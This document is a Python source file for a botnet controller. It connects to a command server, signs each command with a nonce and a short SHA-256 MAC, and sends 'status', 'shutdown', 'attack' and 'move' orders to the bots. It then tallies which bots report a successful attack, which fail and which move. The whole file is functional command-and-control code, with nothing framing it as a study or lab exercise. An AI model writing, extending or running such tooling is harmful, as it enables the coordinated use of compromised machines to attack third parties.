import hashlib
import random
import socket
import sys
import threading
import time


class NcController:
    def __init__(self, server_address, secret):
        self.server_address = server_address
        self.secret = secret
        self.socket = None
        self.response_timeout = 5
        self.running = True
    
    def connect(self):
        host, port = self.server_address.split(':')
        port = int(port)
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((host, port))
            print("Connected to server.")
            return True
        except (socket.error, ConnectionRefusedError):
            print("Error: Could not connect to server.")
            return False
    
    def send_command(self, command):
        nonce = str(random.randint(0, 999999))
        mac = self.compute_mac(nonce)
        full_command = f"{nonce} {mac} {command}"
        
        try:
            self.socket.sendall((full_command + "\n").encode())
            return True
        except (socket.error, BrokenPipeError):
            print("Error: Connection lost.")
            self.running = False
            return False
    
    def compute_mac(self, nonce):
        data = f"{nonce}{self.secret}".encode()
        return hashlib.sha256(data).hexdigest()[:8]
    
    def collect_responses(self):
        responses = []
        start_time = time.time()
        
        self.socket.settimeout(0.1)
        while time.time() - start_time < self.response_timeout:
            try:
                data = self.socket.recv(4096)
                if data:
                    responses.extend(data.decode().splitlines())
            except socket.timeout:
                continue
            except (socket.error, ConnectionError):
                print("Error: Connection lost while collecting responses.")
                self.running = False
                break
        
        return responses
    
    def handle_status(self, responses):
        bots = []
        for line in responses:
            if line.startswith("-status"):
                parts = line.split()
                if len(parts) == 3:
                    bots.append((parts[1], parts[2]))
        
        if not bots:
            print("Result: 0 bots replied.")
            return
        
        bot_list = ", ".join([f"{nick} ({count})" for nick, count in bots])
        print(f"Result: {len(bots)} bots replied.")
        print(bot_list)
    
    def handle_shutdown(self, responses):
        bots = []
        for line in responses:
            if line.startswith("-shutdown"):
                parts = line.split()
                if len(parts) == 2:
                    bots.append(parts[1])
        
        if not bots:
            print("Result: 0 bots shut down.")
            return
        
        print(f"Result: {len(bots)} bots shut down.")
        print(", ".join(bots))
    
    def handle_attack(self, responses):
        success = []
        failures = []
        
        for line in responses:
            if line.startswith("-attack"):
                parts = line.split()
                if len(parts) >= 3:
                    nick = parts[1]
                    status = parts[2]
                    if status == "OK":
                        success.append(nick)
                    else:
                        error = " ".join(parts[3:]) if len(parts) > 3 else "unknown error"
                        failures.append(f"{nick}: {error}")
        
        if success:
            print(f"Result: {len(success)} bots attacked successfully: {', '.join(success)}")
        else:
            print("Result: 0 bots attacked successfully.")
        
        if failures:
            print(f"{len(failures)} bots failed to attack:")
            for failure in failures:
                print(failure)
        elif not success:
            print("0 bots failed to attack.")
    
    def handle_move(self, responses):
        bots = []
        for line in responses:
            if line.startswith("-move"):
                parts = line.split()
                if len(parts) == 2:
                    bots.append(parts[1])
        
        if not bots:
            print("Result: 0 bots moved.")
            return
        
        print(f"Result: {len(bots)} bots moved.")
        print(", ".join(bots))
    
    def run(self):
        if not self.connect():
            return
        
        while self.running:
            try:
                cmd = input("cmd> ").strip()
                if not cmd:
                    continue
                
                if cmd == "quit":
                    self.running = False
                    print("Disconnected.")
                    break
                
                if not self.send_command(cmd):
                    break
                
                if cmd.startswith(("status", "shutdown", "attack", "move")):
                    print(f"Waiting {self.response_timeout}s to gather replies.")
                    responses = self.collect_responses()
                    
                    if cmd.startswith("status"):
                        self.handle_status(responses)
                    elif cmd.startswith("shutdown"):
                        self.handle_shutdown(responses)
                    elif cmd.startswith("attack"):
                        self.handle_attack(responses)
                    elif cmd.startswith("move"):
                        self.handle_move(responses)
            
            except KeyboardInterrupt:
                print("\nUse 'quit' to exit.")
            except EOFError:
                print("\nUse 'quit' to exit.")
        
        if self.socket:
            self.socket.close()

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <hostname>:<port> <secret-phrase>")
        sys.exit(1)
    
    server_address = sys.argv[1]
    secret = sys.argv[2]
    
    controller = NcController(server_address, secret)
    controller.run()

if __name__ == "__main__":
    main()
